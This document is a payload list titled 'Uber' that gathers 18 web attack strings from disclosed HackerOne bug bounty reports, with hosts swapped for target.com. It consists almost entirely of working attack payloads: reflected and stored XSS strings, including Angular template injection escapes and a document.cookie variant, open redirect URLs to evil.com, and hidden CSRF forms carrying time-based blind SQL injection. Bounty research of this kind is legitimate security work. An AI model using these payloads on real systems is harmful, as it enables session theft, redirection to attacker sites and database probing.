# Uber

18 payloads.

### `881171e6`

```
https://target.com/signup/global/?place_id=ChIJPaCKh-tmA4wR7JEkNDrNDSU&location=Carolina<script
```

**Parameter:** `location`
— [XSS on target.com](https://hackerone.com/reports/42393) · Uber · [kirtixs](https://hackerone.com/kirtixs) · $500.0

### `ebcf4112`

```
- Logon to [target.com/careers/list/?city=...](                                                        ><script>alert('xss by pavanw3b')<%2fscript>fupaiiz&country=all&keywords=&subteam=all&team=all) on firefox.
```

**Parameter:** `city`
— [Reflected XSS on target.com careers](https://hackerone.com/reports/117190) · Uber · [pavanw3b](https://hackerone.com/pavanw3b)

### `866c3273`

```
https://target.com//evil.com/cities
```

— [Open Redirection on target.com](https://hackerone.com/reports/119236) · Uber · [rohk](https://hackerone.com/rohk) · $500.0

### `180ccc5e`

```
https://target.com//evil.com/%2F..
```

— [Open Redirect in target.com](https://hackerone.com/reports/125000) · Uber · [bobrov](https://hackerone.com/bobrov) · $500.0

### `e21e9381`

```
https://target.com/docs/deep-linking?q=wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
```

**Parameter:** `q`
— [Reflected XSS on target.com via Angular template injection](https://hackerone.com/reports/125027) · Uber · [albinowax](https://hackerone.com/albinowax) · $3,000.0

### `2279737e`

```
https://target.com/en//example.com/
```

— [Reflected XSS via Unvalidated / Open Redirect in target.com](https://hackerone.com/reports/125791) · Uber · [mdv](https://hackerone.com/mdv) · $3,000.0

### `a1a46a3b`

```
<html><script>alert(0)</script></html>
```

— [XSS In target.com Due to Mime Sniffing in IE](https://hackerone.com/reports/126197) · Uber · [ddworken](https://hackerone.com/ddworken) · $750.0

### `6678f4ad`

```
alert(0)
```

— [XSS In target.com Due to Mime Sniffing in IE](https://hackerone.com/reports/126197) · Uber · [ddworken](https://hackerone.com/ddworken) · $750.0

### `ec7d25ed`

```
{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}
```

— [Stored XSS in target.com](https://hackerone.com/reports/131450) · Uber · [albinowax](https://hackerone.com/albinowax) · $7,500.0

### `6cd52ba3`

```
{
  "status": "ok",
  "code": 200,
  "data": {
    "content": [
      {
        "source": 0,
        "collectionId": "131560603",
        "content": {
          "generator": {
            "id": "target.com"
          },
          "bodyHtml": "<marquee>XSS</marquee><script>alert(\"XSS on \"+ document.domain)</script>",
          "annotations": {
            "likedBy": [
              "54c1e33eb841b37995000d5d@engadget.evil.com"
            ]
          },
          "authorId": "50782a81bc6bf341d3
```

**Parameter:** `bodyHtml`
— [Reflected XSS via Livefyre Media Wall in target.com](https://hackerone.com/reports/134061) · Uber · [mdv](https://hackerone.com/mdv) · $2,000.0

### `2378d482`

```
<form action="https://target.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder" target="_blank"  method="post" style="display: none;">
            <input type="text" name="btnOrderPages" value="Click to Reorder FAQs" />
            <input type="text" name="hdnfaqpageorder" value="id_8,id_7" />
            <input type="text" name="hdnParentID" value="IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)" />
            <input type="text" name="btnReturnParent" value="1" />
           
```

**Parameter:** `hdnParentID`
— [Multiple vulnerabilities in a WordPress plugin at target.com](https://hackerone.com/reports/135288) · Uber · [0xsyndr0me](https://hackerone.com/0xsyndr0me)

### `f5292e72`

```
<form action="https://target.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder" target="_blank"  method="post" style="display: none;">
            <input type="text" name="btnOrderPages" value="Click to Reorder FAQs" />
            <input type="text" name="hdnfaqpageorder" value="id_8,id_7" />
            <input type="text" name="hdnParentID" value="" />
            <input type="text" name="pages" value="IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)" />
            <input typ
```

**Parameter:** `pages`
— [Multiple vulnerabilities in a WordPress plugin at target.com](https://hackerone.com/reports/135288) · Uber · [0xsyndr0me](https://hackerone.com/0xsyndr0me)

### `07d90111`

```
http://target.com/community/daniel?citySource=javascript:alert(%27XSSED%27
```

**Parameter:** `citySource`
— [xss vulnerability in http://target.com/community/daniel](https://hackerone.com/reports/142946) · Uber · [netfuzzer](https://hackerone.com/netfuzzer)

### `af54bc45`

```
https://target.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.domain
```

**Parameter:** `lang_id`
— [XSS At "target.com"](https://hackerone.com/reports/156098) · Uber · [raghav_bisht](https://hackerone.com/raghav_bisht)

### `32209cb2`

```
https://target.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.cookie
```

**Parameter:** `lang_id`
— [XSS At "target.com"](https://hackerone.com/reports/156098) · Uber · [raghav_bisht](https://hackerone.com/raghav_bisht)

### `27fb622b`

```
{"enabled":true,"sid":"bbc661585c424072","url":"target.com","cf":1022963},"queryParams":{"bjbxm</script><script>alert(1)</script>xrii5":"1"}
```

— [SSL-protected Reflected XSS in target.com](https://hackerone.com/reports/296701) · Uber · [gregoryvperry](https://hackerone.com/gregoryvperry)

### `51be1fcc`

```
{"enabled":true,"sid":"bbc661585c424072","url":"target.com","cf":1022963},"queryParams":{"_cc":"asdf\"}}</script><script>alert(1)</script>"},"useragent":{"ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36","browser":
```

**Parameter:** `_cc`
— [SSL-protected Reflected XSS in https://target.com/0-dfffb25d2cf6ceeb0a27.js Endpoint](https://hackerone.com/reports/300080) · Uber · [gregoryvperry](https://hackerone.com/gregoryvperry)

### `548e1214`

```
"}}</script><script>alert(1)</script>
```

**Parameter:** `_cc`
— [SSL-protected Reflected XSS in https://target.com/0-dfffb25d2cf6ceeb0a27.js Endpoint](https://hackerone.com/reports/300080) · Uber · [gregoryvperry](https://hackerone.com/gregoryvperry)
